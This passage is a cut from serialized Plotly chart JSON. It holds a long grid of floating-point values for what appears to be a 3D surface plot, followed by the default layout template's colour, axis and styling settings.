0.11640793830156326, 0.11625711619853973, 0.11587518453598022, 0.11635137349367142, 0.11150495707988739, 0.10120559483766556, 0.08824162930250168, 0.07779219001531601], [-0.06367696076631546, -0.05724635347723961, -0.05736641213297844, -0.054812997579574585, -0.048734866082668304, -0.04399237409234047, -0.040087711066007614, -0.031901076436042786, -0.017464864999055862, -0.007647427264600992, -0.007187114097177982, -0.011565763503313065, -0.008574150502681732, -0.0010353595716878772, 0.010972855612635612, 0.019166935235261917, 0.022509509697556496, 0.01640436053276062, 0.009443327784538269, 0.01057459693402052, 0.01975260116159916, 0.02953900210559368, 0.03443644940853119, 0.03679269179701805, 0.04204491525888443, 0.04922615364193916, 0.0548025406897068, 0.05781171843409538, 0.06170766428112984, 0.07012632489204407, 0.07858778536319733, 0.08458004891872406, 0.08762534707784653, 0.0891418308019638, 0.09159834682941437, 0.09524928778409958, 0.10244493186473846, 0.10647609829902649, 0.10496216267347336, 0.10735982656478882, 0.1140318363904953, 0.12026156485080719, 0.12291846424341202, 0.122868113219738, 0.1200723797082901, 0.1178489699959755, 0.11278115957975388, 0.10471121221780777, 0.09489795565605164, 0.08607007563114166], [-0.06955478340387344, -0.06251604110002518, -0.06210186332464218, -0.0577295646071434, -0.048939116299152374, -0.04271727427840233, -0.040739212185144424, -0.034176722168922424, -0.02114109694957733, -0.01183833833783865, -0.01098609808832407, -0.011765191331505775, -0.005185718648135662, 0.001967101823538542, 0.011221571825444698, 0.013100449927151203, 0.011326336301863194, 0.0059747472405433655, 0.006993846967816353, 0.012081238441169262, 0.021330704912543297, 0.02837303653359413, 0.03348516672849655, 0.03691650554537773, 0.04232294112443924, 0.04873865470290184, 0.05254994332790375, 0.05328674986958504, 0.056499019265174866, 0.06471015512943268, 0.07200483977794647, 0.0768285021185875, 0.08046575635671616, 0.08563535660505295, 0.09144067764282227, 0.09562159329652786, 0.09808629751205444, 0.09857671707868576, 0.09759590029716492, 0.09906435012817383, 0.10504961013793945, 0.11330132931470871, 0.11977969110012054, 0.12126903980970383, 0.11787456274032593, 0.11600284278392792, 0.11353093385696411, 0.1076122522354126, 0.10054931789636612, 0.09445149451494217], [-0.07104654610157013, -0.06395328789949417, -0.06317837536334991, -0.06023484095931053, -0.05324184149503708, -0.046927958726882935, -0.0446234792470932, -0.03855572268366814, -0.02561783231794834, -0.015103527344763279, -0.011802224442362785, -0.007869998924434185, 0.0008580202120356262, 0.0059761893935501575, 0.008576999418437481, 0.003653622232377529, -0.0003311189357191324, -0.002804894233122468, 0.0038095919881016016, 0.010757056064903736, 0.0183569248765707, 0.021582838147878647, 0.025901665911078453, 0.030089709907770157, 0.036514826118946075, 0.04230879247188568, 0.044446639716625214, 0.04281611740589142, 0.04429022595286369, 0.05242408439517021, 0.06385888904333115, 0.07187934219837189, 0.07616078853607178, 0.08138690143823624, 0.08813794702291489, 0.09364131093025208, 0.09228182584047318, 0.08775504678487778, 0.0854833573102951, 0.08647340536117554, 0.09297157824039459, 0.1017100140452385, 0.10918616503477097, 0.11179174482822418, 0.10961181670427322, 0.11112705618143082, 0.1143745705485344, 0.11170708388090134, 0.10637790709733963, 0.10022692382335663], [-0.0650733932852745, -0.05891033262014389, -0.062368202954530716, -0.06549137085676193, -0.06234319880604744, -0.05361171066761017, -0.04822827875614166, -0.04244650900363922, -0.030347635969519615, -0.019154870882630348, -0.012751828879117966, -0.0022575079929083586, 0.0065156989730894566, 0.006062200292944908, 0.0028898650780320168, -0.004425670485943556, -0.01138807088136673, -0.015193823724985123, -0.007507794536650181, 0.0007684684824198484, 0.010507049970328808, 0.016191255301237106, 0.021000659093260765, 0.024351773783564568, 0.027222396805882454, 0.02893454022705555, 0.029644956812262535, 0.032518088817596436, 0.03753553330898285, 0.04548992961645126, 0.055763620883226395, 0.06530016660690308, 0.07102658599615097, 0.07334049046039581, 0.07949962466955185, 0.08893871307373047, 0.08922996371984482, 0.08079899847507477, 0.0749422237277031, 0.07347427308559418, 0.08174799382686615, 0.09184441715478897, 0.10101889818906784, 0.10437479615211487, 0.10363008081912994, 0.10294629633426666, 0.10510421544313431, 0.10792793333530426, 0.10832475870847702, 0.10055568814277649], [-0.060713112354278564, -0.054369159042835236, -0.05818089097738266, -0.06490570306777954, -0.06616797298192978, -0.06061140075325966, -0.055468495935201645, -0.049091581255197525, -0.03536996617913246, -0.022809546440839767, -0.015624831430613995, -0.004822821822017431, 0.0007301010773517191, -0.0028725930023938417, -0.0033046663738787174, -0.0055900271981954575, -0.015271404758095741, -0.02527446672320366, -0.022810472175478935, -0.014084316790103912, -0.0016574887558817863, 0.007044285535812378, 0.012160097248852253, 0.015730369836091995, 0.018798910081386566, 0.018502021208405495, 0.017267966642975807, 0.02137904241681099, 0.02954188920557499, 0.03829551488161087, 0.044974878430366516, 0.05328576639294624, 0.05977138504385948, 0.06162653863430023, 0.06850098073482513, 0.08126766979694366, 0.08814199268817902, 0.08167076110839844, 0.07319860905408859, 0.06713259965181351, 0.07297118008136749, 0.08229775726795197, 0.09034639596939087, 0.092264324426651, 0.09319084882736206, 0.09110527485609055, 0.0914417952299118, 0.09770406037569046, 0.10362734645605087, 0.09838449954986572], [-0.06121376156806946, -0.053919218480587006, -0.05388696491718292, -0.05945907160639763, -0.06281699985265732, -0.06312074512243271, -0.06040644645690918, -0.05264177918434143, -0.03682023286819458, -0.02421005629003048, -0.019446680322289467, -0.013591650873422623, -0.011427530087530613, -0.014086510054767132, -0.010107642970979214, -0.008928961120545864, -0.019984422251582146, -0.03239373117685318, -0.03186241164803505, -0.022851061075925827, -0.010925215668976307, -0.003741129068657756, 0.0004574620979838073, 0.004758037161082029, 0.011034619063138962, 0.011561814695596695, 0.008531852625310421, 0.009301961399614811, 0.018162600696086884, 0.029385969042778015, 0.0369257852435112, 0.04461543634533882, 0.05057593807578087, 0.05372864753007889, 0.06106080114841461, 0.0735287219285965, 0.08317549526691437, 0.07949342578649521, 0.07067396491765976, 0.061192940920591354, 0.061980634927749634, 0.06872566789388657, 0.07471885532140732, 0.07592989504337311, 0.0787397176027298, 0.07999305427074432, 0.08324380964040756, 0.08945362269878387, 0.09648939222097397, 0.09609562903642654], [-0.057244300842285156, -0.05120433121919632, -0.05173971503973007, -0.05502396076917648, -0.057689227163791656, -0.06279968470335007, -0.05949772149324417, -0.04754360392689705, -0.032742563635110855, -0.022355541586875916, -0.018745524808764458, -0.020912859588861465, -0.02548169158399105, -0.025763683021068573, -0.019534755498170853, -0.018386321142315865, -0.028631258755922318, -0.03494706749916077, -0.030630910769104958, -0.024889782071113586, -0.015529346652328968, -0.00596261490136385, -0.0009351445478387177, 0.0009953175904229283, 0.003438460873439908, 0.002566945506259799, -0.0011382651282474399, 0.00019226991571485996, 0.012149094603955746, 0.02647254429757595, 0.03524382412433624, 0.04187509045004845, 0.04778238758444786, 0.05146622285246849, 0.0543837808072567, 0.06122706085443497, 0.07000765204429626, 0.07169272005558014, 0.06543020904064178, 0.05755284056067467, 0.05360965058207512, 0.05565157160162926, 0.06195669621229172, 0.06760479509830475, 0.0711459293961525, 0.07523837685585022, 0.08063936978578568, 0.08230636268854141, 0.08323808759450912, 0.08520501852035522], [-0.04850172623991966, -0.045086849480867386, -0.0502140074968338, -0.052767232060432434, -0.052537333220243454, -0.0549221970140934, -0.04744706675410271, -0.033395882695913315, -0.026847630739212036, -0.02375856600701809, -0.020831501111388206, -0.0240345261991024, -0.029224194586277008, -0.02758818492293358, -0.02265034429728985, -0.024249110370874405, -0.032611530274152756, -0.034106433391571045, -0.028858499601483345, -0.027200134471058846, -0.01959920860826969, -0.006107456982135773, 0.0002282079658471048, 0.0006585312657989562, 0.0006583295180462301, -0.0010673500364646316, -0.004887684248387814, -0.0024058057460933924, 0.01100943237543106, 0.025391051545739174, 0.031635139137506485, 0.03589640185236931, 0.042236123234033585, 0.04712356626987457, 0.04655129835009575, 0.04781215265393257, 0.05135625600814819, 0.05387232452630997, 0.04987897351384163, 0.047906965017318726, 0.0455312617123127, 0.04572097957134247, 0.05499007925391197, 0.06680403649806976, 0.07064627856016159, 0.0753917470574379, 0.08024962246417999, 0.07711873948574066, 0.0711154192686081, 0.0721004456281662], [-0.04288571700453758, -0.04005184769630432, -0.04539710283279419, -0.047304410487413406, -0.04528298228979111, -0.043841343373060226, -0.034675341099500656, -0.022209113463759422, -0.022583352401852608, -0.026051335036754608, -0.02588832937180996, -0.027161402627825737, -0.029410813003778458, -0.027476774528622627, -0.02211773954331875, -0.021968629211187363, -0.02765529416501522, -0.030683478340506554, -0.030095165595412254, -0.029908541589975357, -0.02261413261294365, -0.008977853693068027, -0.002709068590775132, -7.418223685817793e-05, 0.004815218038856983, 0.004578979220241308, -0.0006177151226438582, -0.0022468739189207554, 0.007558110170066357, 0.018773656338453293, 0.020900731906294823, 0.023003360256552696, 0.029421553015708923, 0.03615183383226395, 0.03671018034219742, 0.03703968599438667, 0.03761431202292442, 0.037643030285835266, 0.03325999900698662, 0.03404085338115692, 0.03573943302035332, 0.03864147141575813, 0.05051606148481369, 0.06413562595844269, 0.06838274747133255, 0.07317540049552917, 0.07767818123102188, 0.0737605020403862, 0.06674660742282867, 0.06696069985628128], [-0.043088190257549286, -0.03993033245205879, -0.04374142736196518, -0.04579766094684601, -0.04235529154539108, -0.035136155784130096, -0.026627497747540474, -0.019033538177609444, -0.01962791569530964, -0.02292010933160782, -0.026067223399877548, -0.029943922534585, -0.03240709751844406, -0.03069712594151497, -0.026454249396920204, -0.023084016516804695, -0.02357385866343975, -0.029092103242874146, -0.03461135923862457, -0.032455481588840485, -0.022143373265862465, -0.007591591216623783, 0.0006635865429416299, 0.0075921230018138885, 0.014778690412640572, 0.012959285639226437, 0.004877239931374788, -0.00098619784694165, 0.004997379146516323, 0.014195731841027737, 0.017630819231271744, 0.017626523971557617, 0.019680358469486237, 0.02231777273118496, 0.023688269779086113, 0.024765970185399055, 0.026522507891058922, 0.026406196877360344, 0.021707674488425255, 0.022334182634949684, 0.02505245804786682, 0.030465707182884216, 0.04480009526014328, 0.06003927066922188, 0.06515728682279587, 0.06925018876791, 0.07531572878360748, 0.07569468021392822, 0.07214803993701935, 0.06814651936292648], [-0.04201648756861687, -0.038620948791503906, -0.040417611598968506, -0.04219970852136612, -0.03842165693640709, -0.03057989664375782, -0.026804622262716293, -0.02511787600815296, -0.022754143923521042, -0.021602613851428032, -0.02510450966656208, -0.0294115599244833, -0.03121335059404373, -0.02983132191002369, -0.0295267216861248, -0.026664774864912033, -0.02388046123087406, -0.028593052178621292, -0.03400694578886032, -0.028188135474920273, -0.01722361333668232, -0.006454578600823879, 0.0032078749500215054, 0.013056694529950619, 0.017779851332306862, 0.012795241549611092, 0.0037632561288774014, -0.0012223124504089355, 0.003055129898712039, 0.010468882508575916, 0.01639985665678978, 0.015152325853705406, 0.013646121136844158, 0.014114475809037685, 0.017240412533283234, 0.017765410244464874, 0.0179829690605402, 0.016026010736823082, 0.011551624163985252, 0.011775949969887733, 0.014187405817210674, 0.02059408463537693, 0.03628482669591904, 0.05306840315461159, 0.059831153601408005, 0.06272450089454651, 0.06936918199062347, 0.07521065324544907, 0.07871489971876144, 0.07554060220718384], [-0.036698464304208755, -0.03393173962831497, -0.034713469445705414, -0.03474155068397522, -0.030555693432688713, -0.026138661429286003, -0.026746219024062157, -0.028827844187617302, -0.02977691777050495, -0.028647245839238167, -0.028403669595718384, -0.02486094832420349, -0.020995941013097763, -0.0194436926394701, -0.022098692134022713, -0.022955788299441338, -0.022102560847997665, -0.026646187528967857, -0.030368350446224213, -0.023927494883537292, -0.01613985188305378, -0.01126838382333517, -0.0027357416693121195, 0.007831627503037453, 0.012819844298064709, 0.008432223461568356, 0.0008495327201671898, -0.0024376241490244865, 0.0006328783347271383, 0.005528655834496021, 0.009294756688177586, 0.008124634623527527, 0.00900265946984291, 0.014561562798917294, 0.019840316846966743, 0.01714039221405983, 0.010211208835244179, 0.0032672134693711996, -0.0005801885272376239, 0.0016091796569526196, 0.0051061916165053844, 0.010371903888881207, 0.025364061817526817, 0.04305609315633774, 0.05201347544789314, 0.055714525282382965, 0.062119897454977036, 0.06964317709207535, 0.077232226729393, 0.08002301305532455], [-0.028284071013331413, -0.02712857909500599, -0.02960723452270031, -0.027621546760201454, -0.022537998855113983, -0.022572439163923264, -0.024919481948018074, -0.026725711300969124, -0.032328639179468155, -0.03530697524547577, -0.032297465950250626, -0.02230718731880188, -0.015463055111467838, -0.015274935401976109, -0.017042990773916245, -0.015587914735078812, -0.015433556400239468, -0.02127053402364254, -0.02744349278509617, -0.02300160750746727, -0.016267606988549232, -0.010871335864067078, -0.0031914073042571545, 0.003646830329671502, 0.005600887816399336, 0.004238035064190626, 0.0007575135095976293, -0.0036973366513848305, -0.004726582206785679, -0.002699064090847969, 0.00045010470785200596, 0.004212376661598682, 0.010394332930445671, 0.019549788907170296, 0.02546493336558342, 0.022348206490278244, 0.00998328160494566, -0.0039034229703247547, -0.009329428896307945, -0.008330412209033966, -0.004524636082351208, -0.0004555039049591869, 0.012942727655172348, 0.03260901942849159, 0.047057557851076126, 0.0567135214805603, 0.0625305101275444, 0.06686031818389893, 0.07042854279279709, 0.07357078045606613], [-0.025853751227259636, -0.025247616693377495, -0.027899496257305145, -0.022955721244215965, -0.016199225559830666, -0.01811528019607067, -0.01895546168088913, -0.017225587740540504, -0.02307267114520073, -0.029766766354441643, -0.027594471350312233, -0.01882159896194935, -0.015245256945490837, -0.017490630969405174, -0.01821405254304409, -0.012438512407243252, -0.010246948339045048, -0.014183330349624157, -0.020944250747561455, -0.018604237586259842, -0.011799212545156479, -0.003482686821371317, 0.0029719998128712177, 0.004535115789622068, 0.0033717656042426825, 0.005902822129428387, 0.007054631598293781, 0.0004121628007851541, -0.005610398016870022, -0.00659339502453804, -0.00376663520000875, 0.00576635729521513, 0.01579686440527439, 0.02033909782767296, 0.02198716253042221, 0.02187873050570488, 0.01469600573182106, 0.0011446797288954258, -0.006721870042383671, -0.010269632562994957, -0.008119024336338043, -0.004700131714344025, 0.004071385599672794, 0.02142786979675293, 0.04117082059383392, 0.05918937176465988, 0.06556602567434311, 0.06453650444746017, 0.06043701246380806, 0.06134191155433655], [-0.0246367659419775, -0.022239821031689644, -0.021303324028849602, -0.013842333108186722, -0.006134754978120327, -0.007745285984128714, -0.008166473358869553, -0.005833346862345934, -0.010691291652619839, -0.018961872905492783, -0.020147932693362236, -0.014540055766701698, -0.012891260907053947, -0.01567992940545082, -0.0188374575227499, -0.013934175483882427, -0.008378622122108936, -0.005526767577975988, -0.005807261448353529, -0.0021813276689499617, 0.002082070568576455, 0.005002067424356937, 0.007553841453045607, 0.006634872872382402, 0.005615130998194218, 0.008801767602562904, 0.010999803431332111, 0.006071712821722031, 0.00015355007781181484, -0.002138839801773429, -0.0022856066934764385, 0.0059028202667832375, 0.015087410807609558, 0.015651719644665718, 0.015092829242348671, 0.017224201932549477, 0.017028683796525, 0.00855258945375681, 0.0006306880968622863, -0.004254054743796587, -0.0035523639526218176, -0.001630070386454463, 0.001663894159719348, 0.013065610080957413, 0.03274749964475632, 0.052274614572525024, 0.05851295217871666, 0.05584030598402023, 0.05198100954294205, 0.05733688920736313], [-0.01878304034471512, -0.016055775806307793, -0.010554964654147625, -0.0030537170823663473, 0.002602097112685442, 0.0030220155604183674, 0.002381180413067341, 0.0012994547141715884, -0.004306370858103037, -0.011114909313619137, -0.014060156419873238, -0.013264289125800133, -0.0147475590929389, -0.016406171023845673, -0.01718311384320259, -0.010812613181769848, -0.0027535180561244488, 0.005525027401745319, 0.010362397879362106, 0.014119066298007965, 0.01648600772023201, 0.015902094542980194, 0.014484993182122707, 0.010879592970013618, 0.010581192560493946, 0.014047416858375072, 0.01741311326622963, 0.016348684206604958, 0.010696761310100555, 0.00564964022487402, 0.0012435317039489746, 0.006751471199095249, 0.01482737809419632, 0.015410667285323143, 0.013213478960096836, 0.0138937933370471, 0.015515709295868874, 0.013366413302719593, 0.008946318179368973, 0.006029825191944838, 0.005286811385303736, 0.005605738610029221, 0.003994700964540243, 0.007865612395107746, 0.023953808471560478, 0.04246743768453598, 0.050089363008737564, 0.047297053039073944, 0.04589949920773506, 0.05558069795370102], [-0.006195694673806429, -0.00559283047914505, 0.0016715696547180414, 0.005379856564104557, 0.006055162288248539, 0.009467480704188347, 0.008772740140557289, 0.0020703680347651243, -0.0060302033089101315, -0.00875343382358551, -0.010311868041753769, -0.013396522961556911, -0.018363339826464653, -0.01878485083580017, -0.014106682501733303, -0.0046235970221459866, 0.0045376988127827644, 0.014722402207553387, 0.020193301141262054, 0.021849073469638824, 0.02574899047613144, 0.02983454056084156, 0.027460845187306404, 0.021206814795732498, 0.0204613134264946, 0.023990528658032417, 0.0276810210198164, 0.02690277434885502, 0.018687715753912926, 0.010244923643767834, 0.004897584207355976, 0.009693787433207035, 0.016717985272407532, 0.021082613617181778, 0.01823389157652855, 0.014684665948152542, 0.010988222435116768, 0.012327782809734344, 0.012878411449491978, 0.011927604675292969, 0.00831935741007328, 0.008170956745743752, 0.00886457972228527, 0.012635285966098309, 0.023774638772010803, 0.03852448984980583, 0.046821802854537964, 0.04465729370713234, 0.04461410269141197, 0.05257171392440796], [0.0018808860331773758, 0.0019585697446018457, 0.008154749870300293, 0.008944493718445301, 0.0069402847439050674, 0.01066309493035078, 0.010365244932472706, 0.0029840583447366953, -0.004019689746201038, -0.0033566139172762632, -0.0029567736200988293, -0.0055143809877336025, -0.011374132707715034, -0.013735143467783928, -0.012482083402574062, -0.00599979842081666, 0.0042133149690926075, 0.01754583977162838, 0.025486858561635017, 0.026583367958664894, 0.031192008405923843, 0.038212329149246216, 0.037739794701337814, 0.0328175388276577, 0.03284831345081329, 0.03626297414302826, 0.038896963000297546, 0.03560619428753853, 0.025492772459983826, 0.015785949304699898, 0.010802838020026684, 0.014356289058923721, 0.018724408000707626, 0.023083969950675964, 0.02059832401573658, 0.017220670357346535, 0.012571802362799644, 0.014018772169947624, 0.014667212031781673, 0.012330997735261917, 0.007285116706043482, 0.008469444699585438, 0.014001349918544292, 0.021537568420171738, 0.02917000837624073, 0.03897835686802864, 0.044532373547554016, 0.04317669942975044, 0.044465817511081696, 0.05111240968108177], [0.0031087370589375496, 0.0033785162959247828, 0.009885755367577076, 0.011391923762857914, 0.00971985049545765, 0.012831372208893299, 0.01318634394556284, 0.0076056052930653095, 0.0018704666290432215, 0.004094247706234455, 0.006303244270384312, 0.0040868474170565605, -0.001972807804122567, -0.005736948922276497, -0.010334383696317673, -0.010339722968637943, -0.0004949058638885617, 0.016028976067900658, 0.02759052813053131, 0.028793523088097572, 0.033206757158041, 0.04248784855008125, 0.045941464602947235, 0.04413601756095886, 0.043984346091747284, 0.0465397983789444, 0.04848543927073479, 0.043990567326545715, 0.0335182324051857, 0.023442450910806656, 0.018107911571860313, 0.01993544027209282, 0.021706342697143555, 0.024454912170767784, 0.02192358486354351, 0.01998448744416237, 0.01844925992190838, 0.020405856892466545, 0.018712561577558517, 0.014417611062526703, 0.009080134332180023, 0.011062839068472385, 0.018242770805954933, 0.028045253828167915, 0.03374601528048515, 0.03796112909913063, 0.03916620463132858, 0.041241373866796494, 0.04694007709622383, 0.05312880501151085], [0.0012528664665296674, 0.0008864431292749941, 0.007588230073451996, 0.012617615051567554, 0.013963158242404461, 0.016229121014475822, 0.017100287601351738, 0.01421851571649313, 0.008879815228283405, 0.010305278934538364, 0.012640978209674358, 0.0070013245567679405, -0.0003466681810095906, -0.002650606445968151, -0.006367804948240519, -0.007856319658458233, 0.0012663229135796428, 0.017492441460490227, 0.02868366427719593, 0.029507368803024292, 0.03257668763399124, 0.04273202270269394, 0.050096314400434494, 0.05137797072529793, 0.05004815757274628, 0.05124645307660103, 0.053739696741104126, 0.051434215158224106, 0.04264447093009949, 0.03268880397081375, 0.025583824142813683, 0.025594869628548622, 0.026236247271299362, 0.028268449008464813, 0.02570083923637867, 0.024752449244260788, 0.02629273571074009, 0.02783249318599701, 0.023056572303175926, 0.020230460911989212, 0.017892751842737198, 0.018676793202757835, 0.021028559654951096, 0.028471576049923897, 0.03395598754286766, 0.034668855369091034, 0.034145843237638474, 0.04268660768866539, 0.05489252507686615, 0.05953839793801308]]}], {\"scene\": {\"zaxis\": {\"range\": [-0.0994970053434372, 0.12291846424341202]}}, \"template\": {\"data\": {\"bar\": [{\"error_x\": {\"color\": \"#2a3f5f\"}, \"error_y\": {\"color\": \"#2a3f5f\"}, \"marker\": {\"line\": {\"color\": \"#E5ECF6\", \"width\": 0.5}}, \"type\": \"bar\"}], \"barpolar\": [{\"marker\": {\"line\": {\"color\": \"#E5ECF6\", \"width\": 0.5}}, \"type\": \"barpolar\"}], \"carpet\": [{\"aaxis\": {\"endlinecolor\": \"#2a3f5f\", \"gridcolor\": \"white\", \"linecolor\": \"white\", \"minorgridcolor\": \"white\", \"startlinecolor\": \"#2a3f5f\"}, \"baxis\": {\"endlinecolor\": \"#2a3f5f\", \"gridcolor\": \"white\", \"linecolor\": \"white\", \"minorgridcolor\": \"white\", \"startlinecolor\": \"#2a3f5f\"}, \"type\": \"carpet\"}], \"choropleth\": [{\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}, \"type\": \"choropleth\"}], \"contour\": [{\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}, \"colorscale\": [[0.0, \"#0d0887\"], [0.1111111111111111, \"#46039f\"], [0.2222222222222222, \"#7201a8\"], [0.3333333333333333, \"#9c179e\"], [0.4444444444444444, \"#bd3786\"], [0.5555555555555556, \"#d8576b\"], [0.6666666666666666, \"#ed7953\"], [0.7777777777777778, \"#fb9f3a\"], [0.8888888888888888, \"#fdca26\"], [1.0, \"#f0f921\"]], \"type\": \"contour\"}], \"contourcarpet\": [{\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}, \"type\": \"contourcarpet\"}], \"heatmap\": [{\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}, \"colorscale\": [[0.0, \"#0d0887\"], [0.1111111111111111, \"#46039f\"], [0.2222222222222222, \"#7201a8\"], [0.3333333333333333, \"#9c179e\"], [0.4444444444444444, \"#bd3786\"], [0.5555555555555556, \"#d8576b\"], [0.6666666666666666, \"#ed7953\"], [0.7777777777777778, \"#fb9f3a\"], [0.8888888888888888, \"#fdca26\"], [1.0, \"#f0f921\"]], \"type\": \"heatmap\"}], \"heatmapgl\": [{\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}, \"colorscale\": [[0.0, \"#0d0887\"], [0.1111111111111111, \"#46039f\"], [0.2222222222222222, \"#7201a8\"], [0.3333333333333333, \"#9c179e\"], [0.4444444444444444, \"#bd3786\"], [0.5555555555555556, \"#d8576b\"], [0.6666666666666666, \"#ed7953\"], [0.7777777777777778, \"#fb9f3a\"], [0.8888888888888888, \"#fdca26\"], [1.0, \"#f0f921\"]], \"type\": \"heatmapgl\"}], \"histogram\": [{\"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"histogram\"}], \"histogram2d\": [{\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}, \"colorscale\": [[0.0, \"#0d0887\"], [0.1111111111111111, \"#46039f\"], [0.2222222222222222, \"#7201a8\"], [0.3333333333333333, \"#9c179e\"], [0.4444444444444444, \"#bd3786\"], [0.5555555555555556, \"#d8576b\"], [0.6666666666666666, \"#ed7953\"], [0.7777777777777778, \"#fb9f3a\"], [0.8888888888888888, \"#fdca26\"], [1.0, \"#f0f921\"]], \"type\": \"histogram2d\"}], \"histogram2dcontour\": [{\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}, \"colorscale\": [[0.0, \"#0d0887\"], [0.1111111111111111, \"#46039f\"], [0.2222222222222222, \"#7201a8\"], [0.3333333333333333, \"#9c179e\"], [0.4444444444444444, \"#bd3786\"], [0.5555555555555556, \"#d8576b\"], [0.6666666666666666, \"#ed7953\"], [0.7777777777777778, \"#fb9f3a\"], [0.8888888888888888, \"#fdca26\"], [1.0, \"#f0f921\"]], \"type\": \"histogram2dcontour\"}], \"mesh3d\": [{\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}, \"type\": \"mesh3d\"}], \"parcoords\": [{\"line\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"parcoords\"}], \"pie\": [{\"automargin\": true, \"type\": \"pie\"}], \"scatter\": [{\"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"scatter\"}], \"scatter3d\": [{\"line\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"scatter3d\"}], \"scattercarpet\": [{\"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"scattercarpet\"}], \"scattergeo\": [{\"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"scattergeo\"}], \"scattergl\": [{\"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"scattergl\"}], \"scattermapbox\": [{\"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"scattermapbox\"}], \"scatterpolar\": [{\"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"scatterpolar\"}], \"scatterpolargl\": [{\"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"scatterpolargl\"}], \"scatterternary\": [{\"marker\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"type\": \"scatterternary\"}], \"surface\": [{\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}, \"colorscale\": [[0.0, \"#0d0887\"], [0.1111111111111111, \"#46039f\"], [0.2222222222222222, \"#7201a8\"], [0.3333333333333333, \"#9c179e\"], [0.4444444444444444, \"#bd3786\"], [0.5555555555555556, \"#d8576b\"], [0.6666666666666666, \"#ed7953\"], [0.7777777777777778, \"#fb9f3a\"], [0.8888888888888888, \"#fdca26\"], [1.0, \"#f0f921\"]], \"type\": \"surface\"}], \"table\": [{\"cells\": {\"fill\": {\"color\": \"#EBF0F8\"}, \"line\": {\"color\": \"white\"}}, \"header\": {\"fill\": {\"color\": \"#C8D4E3\"}, \"line\": {\"color\": \"white\"}}, \"type\": \"table\"}]}, \"layout\": {\"annotationdefaults\": {\"arrowcolor\": \"#2a3f5f\", \"arrowhead\": 0, \"arrowwidth\": 1}, \"coloraxis\": {\"colorbar\": {\"outlinewidth\": 0, \"ticks\": \"\"}}, \"colorscale\": {\"diverging\": [[0, \"#8e0152\"], [0.1, \"#c51b7d\"], [0.2, \"#de77ae\"], [0.3, \"#f1b6da\"], [0.4, \"#fde0ef\"], [0.5, \"#f7f7f7\"], [0.6, \"#e6f5d0\"], [0.7, \"#b8e186\"], [0.8, \"#7fbc41\"], [0.9, \"#4d9221\"], [1, \"#276419\"]], \"sequential\": [[0.0, \"#0d0887\"], [0.1111111111111111, \"#46039f\"], [0.2222222222222222, \"#7201a8\"], [0.3333333333333333, \"#9c179e\"], [0.4444444444444444, \"#bd3786\"], [0.5555555555555556, \"#d8576b\"], [0.6666666666666666, \"#ed7953\"], [0.7777777777777778, \"#fb9f3a\"], [0.8888888888888888, \"#fdca26\"], [1.0, \"#f0f921\"]], \"sequentialminus\": [[0.0, \"#0d0887\"], [0.1111111111111111, \"#46039f\"], [0.2222222222222222, \"#7201a8\"], [0.3333333333333333, \"#9c179e\"], [0.4444444444444444, \"#bd3786\"], [0.5555555555555556, \"#d8576b\"], [0.6666666666666666, \"#ed7953\"], [0.7777777777777778, \"#fb9f3a\"], [0.8888888888888888, \"#fdca26\"], [1.0, \"#f0f921\"]]}, \"colorway\": [\"#636efa\", \"#EF553B\", \"#00cc96\", \"#ab63fa\", \"#FFA15A\", \"#19d3f3\", \"#FF6692\", \"#B6E880\", \"#FF97FF\", \"#FECB52\"], \"font\": {\"color\": \"#2a3f5f\"}, \"geo\": {\"bgcolor\": \"white\", \"lakecolor\": \"white\", \"landcolor\": \"#E5ECF6\", \"showlakes\": true, \"showland\": true, \"subunitcolor\": \"white\"}, \"hoverlabel\": {\"align\": \"left\"}, \"hovermode\": \"closest\", \"mapbox\": {\"style\": \"light\"}, \"paper_bgcolor\": \"white\", \"plot_bgcolor\": \"#E5ECF6\", \"polar\": {\"angularaxis\": {\"gridcolor\": \"white\", \"linecolor\": \"white\", \"ticks\": \"\"}, \"bgcolor\": \"#E5ECF6\", \"radialaxis\": {\"gridcolor\": \"white\", \"linecolor\": \"white\", \"ticks\": \"\"}}, \"scene\": {\"xaxis\": {\"backgroundcolor\": \"#E5ECF6\", \"gridcolor\": \"white\", \"gridwidth\": 2, \"linecolor\": \"white\", \"showbackground\": true, \"ticks\": \"\", \"zerolinecolor\": \"white\"}, \"yaxis\": {\"backgroundcolor\": \"#E5ECF6\", \"gridcolor\": \"white\", \"gridwidth\": 2, \"linecolor\": \"white\", \"showbackground\": true, \"ticks\": \"\", \"zerolinecolor\": \"white\"}, \"zaxis\": {\"backgroundcolor\": \"#E5ECF6\", \"gridcolor\": \"white\", \"gridwidth\": 2, \"linecolor\": \"white\", \"showbackground\": true, \"ticks\": \"\", \"zerolinecolor\": \"white\"}}, \"shapedefaults\": {\"line\": {\"color\": \"#2a3f5f\"}}, \"ternary\": {\"aaxis\": {\"gridcolor\": \"white\", \"linecolor\": \"white\", \"ticks\": \"\"}, \"baxis\": {\"gridcolor\": \"white\", \"linecolor\": \"white\", \"ticks\": \"\"}, \"bgcolor\": \"#E5ECF6\", \"caxis\": 